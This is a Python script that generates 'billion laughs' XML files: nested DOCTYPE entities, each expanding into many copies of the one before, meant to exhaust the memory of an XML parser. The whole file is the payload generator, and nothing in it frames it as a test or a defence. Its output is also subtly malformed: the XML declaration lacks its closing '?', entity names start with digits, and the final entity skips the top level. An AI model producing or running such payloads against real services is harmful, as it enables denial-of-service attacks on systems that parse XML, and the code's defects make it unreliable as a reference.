#!/usr/bin/python3
import sys
i = 0
j = i - 1

def xml(i, j):
    projname = input('Project name: ')
    while True:
        try:
            amouent = int(input('Amount of Entities: '))
            break
        except:
            print('Could not convert it...make sure you only type integers.')
    while True:
        try:
            refent = int(input('Amount of References: '))
            break
        except:
            print('Could not convert it...make sure you only type integers.')

    file = projname + r'.xml'
    fx = open(file, 'w')
    fx.write('<?xml version="1.0">\n')
    fx.write('<!DOCTYPE ' + projname + ' [\n')
    fx.write('  <!ENTITY 0 "ABCDEFGHIJKLMNOPQRSTUVWXYZ">\n')
    for _ in range(amouent):
        i = i + 1
        j = i - 1
        i_str = str(i)
        j_str = str(j)
        fx.write('  <!ENTITY ' + i_str + ' "')
        for _ in range(refent):
            fx.write(r'&' + j_str + ';')
        fx.write('">\n')
    fx.write('  <!ENTITY start "&' + j_str + ';">\n')
    fx.write(']>\n')
    fx.write('<' + projname + '>&start;</' + projname + '>')
    fx.close()

while True:
    xml(i , j)
    ex = input('Continue? (Yes/no) (AnyKey/n): ')
    if ex == 'n':
        sys.exit(0)
        
